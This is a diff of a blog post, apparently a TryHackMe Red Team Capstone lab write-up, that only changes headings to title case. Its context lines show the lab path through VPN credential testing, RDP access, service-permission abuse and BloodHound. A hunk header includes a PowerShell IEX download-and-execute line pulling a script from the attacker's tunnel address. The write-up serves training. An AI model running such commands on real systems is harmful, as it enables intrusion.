@@ -1,5 +1,5 @@
 ---
-title: "Red Team Capstone Challenge: A Partial Lab Write-up"
+title: "Red Team Capstone Challenge: A Partial Lab Write-Up"
 description: "My TryHackMe Red Team Capstone assessment for Certificate IV in Cyber Security, covering corporate access, Active Directory, and progress before the lab reset."
 date: 2026-11-07 12:00:00 +1000
 categories: [Cyber Security, Lab Walkthroughs]
@@ -241,7 +241,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 <section id="pdf-page-8" class="pdf-source-section" data-pdf-page="8" aria-label="Source page 8">
 <figure style="width: 36.58%"><a href="/assets/img/posts/red-team-capstone/page-08-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-08-figure-01.png" alt="Scan overview" width="372" height="406" loading="lazy"></a></figure>
 
-<h2 id="10-200-40-11-mail-server"><strong>10.200.40.11 - Mail server</strong></h2>
+<h2 id="10-200-40-11-mail-server"><strong>10.200.40.11 - Mail Server</strong></h2>
 
 <ul><li>22/tcp — SSH — OpenSSH for Windows 7.7</li><li>25/tcp — SMTP — hMailServer smtpd</li><li>80/tcp — HTTP — Microsoft IIS 10.0</li><li>110/tcp — POP3 — hMailServer pop3d</li><li>135/tcp — MSRPC — Microsoft Windows RPC</li><li>139/tcp — NetBIOS-SSN — Microsoft Windows NetBIOS</li><li>143/tcp — IMAP — hMailServer imapd</li><li>445/tcp — Microsoft-DS — SMB</li><li>587/tcp — SMTP — hMailServer smtpd</li><li>3306/tcp — MySQL — MySQL 8.0.31</li><li>3389/tcp — RDP — Microsoft Terminal Services</li><li>5985/tcp — HTTP — Microsoft HTTPAPI 2.0</li></ul>
 
@@ -266,7 +266,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <!-- PDF page 9 -->
 <section id="pdf-page-9" class="pdf-source-section" data-pdf-page="9" aria-label="Source page 9">
-<h2 id="web-enumeration">Web enumeration</h2>
+<h2 id="web-enumeration">Web Enumeration</h2>
 <pre><code>HTTP title: VPN Request Portal</code></pre>
 
 <ul><li>OS: Ubuntu Linux</li></ul>
@@ -337,7 +337,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <!-- PDF page 15 -->
 <section id="pdf-page-15" class="pdf-source-section" data-pdf-page="15" aria-label="Source page 15">
-<h2 id="vpn-portal">VPN portal and exposed profiles</h2>
+<h2 id="vpn-portal">VPN Portal and Exposed Profiles</h2>
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-15-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-15-figure-01.png" alt="VPN request portal" width="1016" height="808" loading="lazy"></a></figure>
 
 <p>The portal presented a username and password form.</p>
@@ -390,7 +390,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <!-- PDF page 19 -->
 <section id="pdf-page-19" class="pdf-source-section" data-pdf-page="19" aria-label="Source page 19">
-<h2 id="credential-testing">Corporate credential testing</h2>
+<h2 id="credential-testing">Corporate Credential Testing</h2>
 <p>I used a short Python script to generate password candidates from the supplied list and permitted special characters.</p>
 
 <figure style="width: 80.97%"><a href="/assets/img/posts/red-team-capstone/page-19-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-19-figure-01.png" alt="Password candidate generation" width="824" height="378" loading="lazy"></a></figure>
@@ -429,7 +429,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <!-- PDF page 21 -->
 <section id="pdf-page-21" class="pdf-source-section" data-pdf-page="21" aria-label="Source page 21">
-<h2 id="corporate-vpn">Connecting to the corporate VPN</h2>
+<h2 id="corporate-vpn">Connecting to the Corporate VPN</h2>
 <p>I downloaded the profile from <code>http://10.200.40.12/vpn/corpUsername.ovpn</code>.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-01.png" alt="Downloading the profile" width="1016" height="218" loading="lazy"></a></figure>
@@ -472,7 +472,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <!-- PDF page 25 -->
 <section id="pdf-page-25" class="pdf-source-section" data-pdf-page="25" aria-label="Source page 25">
-<h2 id="workstation-access">Workstation access and flag submission</h2>
+<h2 id="workstation-access">Workstation Access and Flag Submission</h2>
 <figure style="width: 74.78%"><a href="/assets/img/posts/red-team-capstone/page-25-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-25-figure-01.png" alt="Workstation access" width="760" height="570" loading="lazy"></a></figure>
 
 <p>I tested Laura's corporate credentials over RDP against WRK1 at 10.200.40.21.</p>
@@ -542,7 +542,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <!-- PDF page 30 -->
 <section id="pdf-page-30" class="pdf-source-section" data-pdf-page="30" aria-label="Source page 30">
-<h2 id="local-administration">Local administration and service permissions</h2>
+<h2 id="local-administration">Local Administration and Service Permissions</h2>
 <figure style="width: 44.10%"><a href="/assets/img/posts/red-team-capstone/page-30-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-30-figure-01.png" alt="Local administration" width="448" height="840" loading="lazy"></a></figure>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-30-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-30-figure-02.png" alt="Service permissions" width="1016" height="480" loading="lazy"></a></figure>
@@ -628,7 +628,7 @@ Restart-Service -Name &#x27;Backup&#x27; -Force</code></pre>
 
 <!-- PDF page 35 -->
 <section id="pdf-page-35" class="pdf-source-section" data-pdf-page="35" aria-label="Source page 35">
-<h2 id="domain-enumeration">Domain discovery and BloodHound</h2>
+<h2 id="domain-enumeration">Domain Discovery and BloodHound</h2>
 <p>My next focus was the corporate domain controller.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-35-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-35-figure-01.png" alt="Domain discovery" width="1016" height="1016" loading="lazy"></a></figure>
@@ -710,7 +710,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <!-- PDF page 40 -->
 <section id="pdf-page-40" class="pdf-source-section" data-pdf-page="40" aria-label="Source page 40">
-<h2 id="unresolved-domain-access">The unresolved Domain Admin step</h2>
+<h2 id="unresolved-domain-access">The Unresolved Domain Admin Step</h2>
 <figure style="width: 76.70%"><a href="/assets/img/posts/red-team-capstone/page-40-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-40-figure-01.png" alt="Unresolved Domain Admin step" width="780" height="702" loading="lazy"></a></figure>
 
 <p>I suspected another participant had changed Laura's privileges in the shared lab, but I could not tell who had changed them or when.</p>
@@ -744,7 +744,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <!-- PDF page 43 -->
 <section id="pdf-page-43" class="pdf-source-section" data-pdf-page="43" aria-label="Source page 43">
-<h2 id="forest-trusts">Forest trusts and privileged access</h2>
+<h2 id="forest-trusts">Forest Trusts and Privileged Access</h2>
 <p>The network diagram after the next four flag submissions:</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-43-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-43-figure-01.png" alt="Network diagram" width="1016" height="704" loading="lazy"></a></figure>
@@ -836,7 +836,7 @@ net user n0debranchEA /domain</code></pre>
 
 <!-- PDF page 48 -->
 <section id="pdf-page-48" class="pdf-source-section" data-pdf-page="48" aria-label="Source page 48">
-<h2 id="remaining-evidence">Collecting the remaining flags</h2>
+<h2 id="remaining-evidence">Collecting the Remaining Flags</h2>
 <p>The ROOTDC and BANKDC sessions:</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-01.png" alt="ROOTDC operation" width="1016" height="148" loading="lazy"></a></figure>
@@ -884,7 +884,7 @@ net user n0debranchEA /domain</code></pre>
 
 <!-- PDF page 51 -->
 <section id="pdf-page-51" class="pdf-source-section" data-pdf-page="51" aria-label="Source page 51">
-<h2 id="where-the-attempt-ended">Where the attempt ended</h2>
+<h2 id="where-the-attempt-ended">Where the Attempt Ended</h2>
 <h3 id="flag-14">Flag 14</h3>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-51-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-51-figure-01.png" alt="Flag 14" width="1016" height="444" loading="lazy"></a></figure>
@@ -902,7 +902,7 @@ net user n0debranchEA /domain</code></pre>
 
 <!-- PDF page 52 -->
 <section id="pdf-page-52" class="pdf-source-section" data-pdf-page="52" aria-label="Results and references">
-<h2 id="evidence-and-gaps">Where I got to</h2>
+<h2 id="evidence-and-gaps">Where I Got To</h2>
 <div class="table-wrapper"><table>
 <thead><tr><th>Stage</th><th>What happened</th></tr></thead>
 <tbody>
@@ -916,7 +916,7 @@ net user n0debranchEA /domain</code></pre>
 </tbody></table></div>
 <p>If I revisit the room, I would start with a fresh deployment, work through CORP privilege escalation, and continue into the SWIFT environment.</p>
 
-<h2 id="lessons-learned">What I learned</h2>
+<h2 id="lessons-learned">What I Learned</h2>
 <p>Remmina's shared folder made moving files much easier. I also had to keep track of my changing VPN address and which account I was using on each host. Next time I would keep clearer notes on those details and the SharpHound errors.</p>
 <h2 id="references">References</h2>
 
